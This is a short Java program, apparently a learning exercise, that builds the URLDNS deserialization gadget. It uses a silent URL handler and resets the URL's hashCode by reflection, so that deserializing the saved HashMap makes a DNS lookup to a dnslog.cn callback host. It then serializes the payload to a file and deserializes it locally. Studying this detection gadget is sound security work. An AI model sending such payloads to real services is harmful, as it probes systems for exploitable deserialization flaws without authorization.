import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.InetAddress;

public class URLDNS3 {

    static class SilentURLStreamHandler extends URLStreamHandler {

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }


        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }

    }



    public static void main(String[] args) throws Exception {
        HashMap<URL,Integer> hashMap = new HashMap<>();
        URLStreamHandler handler = new SilentURLStreamHandler();
        URL url = new URL(null,"http://urldns3.test.dnslog.cn",handler);
        hashMap.put(url,0);

        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url,-1);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("urldns3.bin"));
        objectOutputStream.writeObject(hashMap);
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("urldns3.bin"));
        objectInputStream.readObject();
    }
}
